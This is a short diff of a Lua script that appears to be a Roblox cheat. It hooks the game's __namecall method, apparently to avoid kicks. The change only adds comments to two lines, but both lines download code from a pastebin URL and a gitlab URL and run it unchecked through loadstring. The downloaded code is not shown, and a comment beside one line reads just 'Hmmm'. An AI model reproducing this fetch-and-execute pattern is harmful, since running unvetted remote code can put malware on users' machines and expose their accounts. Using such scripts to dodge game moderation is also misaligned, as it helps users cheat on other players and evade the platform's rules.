@@ -27,5 +27,5 @@ OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
     return OldNameCall(Self, ...)
 end)
 
-loadstring(game:HttpGet("https://pastebin.com/raw/udvneMTk"))()
-loadstring(game:HttpGet("https://gitlab.com/S4nZz/sanz/-/raw/main/peesex"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/udvneMTk"))() -- 2nd Anti-Kick (im paranoid)
+loadstring(game:HttpGet("https://gitlab.com/S4nZz/sanz/-/raw/main/peesex"))() -- Hmmm
